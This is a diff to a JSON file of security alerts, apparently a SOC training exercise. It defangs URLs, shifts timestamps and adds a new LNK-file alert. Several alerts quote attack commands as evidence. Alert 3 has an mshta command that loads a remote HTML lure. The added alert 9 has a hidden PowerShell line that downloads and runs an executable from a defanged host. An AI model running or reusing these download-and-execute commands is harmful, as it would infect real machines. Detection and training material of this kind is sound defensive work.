@@ -11,11 +11,12 @@
     "513125649884beebb5f0545130dbd6f50c2fbf813e1be2584a3bc7b10fbb29d2",
     "a38bff28bff04c6b8959110493e1922874796f14a129f63fd43ebe9c72cc70c4",
     "e21202aee4910c8fef1c689e93ce89323a55b009895538cca0664e06376e3865",
-    "75e5a3209d58b0a480cce34cb68ea40ce7be998e6c1ca3fcb7fe3d1c771c37b9"
+    "75e5a3209d58b0a480cce34cb68ea40ce7be998e6c1ca3fcb7fe3d1c771c37b9",
+    "2c346f4318992cdc2bbbe6a0df4dcf11c47867b43c2f987643d3d5418d4e05db"
   ],
   "alerts": [
     {
-      "id": 1, "timestamp": 1766616998, "severity": 1,
+      "id": 1, "timestamp": 1767616998, "severity": 1,
       "briefdesc": "TCP scanning detected",
       "description": "Matches various TCP scan characteristics, such as Connection scan, Silent scan, FIN scan and Xmas scan.",
       "fields": {
@@ -30,7 +31,7 @@
       }
     },
     {
-      "id": 2, "timestamp": 1766617155, "severity": 2,
+      "id": 2, "timestamp": 1767617155, "severity": 2,
       "briefdesc": "Powershell execution using Base64 payload",
       "description": "Matches any command using powershell with -e, -enc or -EncodedCommand option as it is often indicator of malicious activity and masquerading attempts.",
       "fields": {
@@ -44,7 +45,7 @@
       }
     },
     {
-      "id": 3, "timestamp": 1766617855, "severity": 2,
+      "id": 3, "timestamp": 1767617855, "severity": 2,
       "briefdesc": "Suspicious executable payload in clipboard",
       "description": "Attackers can often exploit the human vector to make users copy and paste malicious commands into the Windows Run prompt (Win+R)",
       "fields": {
@@ -53,11 +54,11 @@
         "department": "Accounting department",
         "user": "SmithCar",
         "command_executable": "Microsoft HTML application host",
-        "command_line": "mshta.exe hxxps://x63-hello.live/nF3mXcQ9FVjs1sMt.html #'' I'm human ID241619''"
+        "command_line": "mshta.exe hxxps://x63-hello[.]live/nF3mXcQ9FVjs1sMt[.]html #'' I'm human ID241619''"
       }
     },
     {
-      "id": 4, "timestamp": 1766617955, "severity": 3,
+      "id": 4, "timestamp": 1767617955, "severity": 3,
       "briefdesc": "Possible C2 beacon activity",
       "description": "This rule detects periodic connection activity up to beaconing every 5 minutes. This is often a sign of C2 communication.",
       "fields": {
@@ -69,11 +70,11 @@
         "dst_ip": "91.189.91.98",
         "dst_name": "connectivity-check.ubuntu.com",
         "parent_process": "NetworkManager",
-        "command_line": "curl -fsS http://connectivity-check.ubuntu.com"
+        "command_line": "curl -fsS hxxp://connectivity-check[.]ubuntu[.]com"
       }
     },
     {
-      "id": 5, "timestamp": 1766618123, "severity": 3,
+      "id": 5, "timestamp": 1767618123, "severity": 3,
       "briefdesc": "Possible web path / configuration file enumeration",
       "description": "This rule signifies and attacker trying to enumerate common paths for a web service (/wp-config.php, /backup.zip, etc.). This is detected by a spike in amount of 404 responses from the server.",
       "fields": {
@@ -88,7 +89,7 @@
       }
     },
     {
-      "id": 6, "timestamp": 1766619977, "severity": 4,
+      "id": 6, "timestamp": 1767619977, "severity": 4,
       "briefdesc": "Protocol over non-standard port",
       "description": "Attackers will often use non-standard ports for C2 communication to avoid detection.",
       "fields": {
@@ -100,11 +101,11 @@
         "protocol": "HTTP",
         "port": 5000,
         "path": "/login",
-        "url": "http://192.168.5.13:5000/login"
+        "url": "hxxp://192[.]168[.]5[.]13:5000/login"
       }
     },
     {
-      "id": 7, "timestamp": 1766625555, "severity": 1,
+      "id": 7, "timestamp": 1767625555, "severity": 1,
       "briefdesc": "Possible Data Exfiltration",
       "description": "This rule matches anytime the amount of traffic from a device reaches over 3GB per day.",
       "fields": {
@@ -119,7 +120,7 @@
       }
     },
     {
-      "id": 8, "timestamp": 1766725555, "severity": 3,
+      "id": 8, "timestamp": 1767725555, "severity": 3,
       "briefdesc": "Unusual User-Agent detected",
       "description": "This alert triggers when a request to a web server features an unusual User-Agent (defined through a list)",
       "fields": {
@@ -129,8 +130,22 @@
         "src_ip": "127.0.0.1",
         "src_hostname": "SRV-WEB-1",
         "user_agent": "curl/7.68.0",
-        "request_domain": "internal.company.cz",
+        "request_domain": "internal[.]company[.]cz",
         "request_path": "/"
+      }
+    },
+    {
+      "id": 9, "timestamp": 1767725655, "severity": 4,
+      "briefdesc": "A LNK file was created",
+      "description": "Alert triggers when a .lnk (windows shortcut) file is created. Lnk files can bne genuine, but can also serve for executing malicious payloads",
+      "fields": {
+        "host_ip": "192.168.114.9",
+        "hostname": "LEG-27-PC-6",
+        "department": "Legal department",
+        "user": "KrakenJoe",
+        "path": "C:\\Users\\KrakenJoe\\Downloads\\People of America meeting info\\Website.lnk",
+        "lnk_pointsto": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -com iex(\"iwr hxxp://aga[.]ferld[.]ke/winrecovery.exe -OutFile C:\\ProgramData\\winrecovery.exe; C:\\ProgramData\\winrecovery.exe\")",
+        "lnk_comment": "People of America website"
       }
     }
   ]
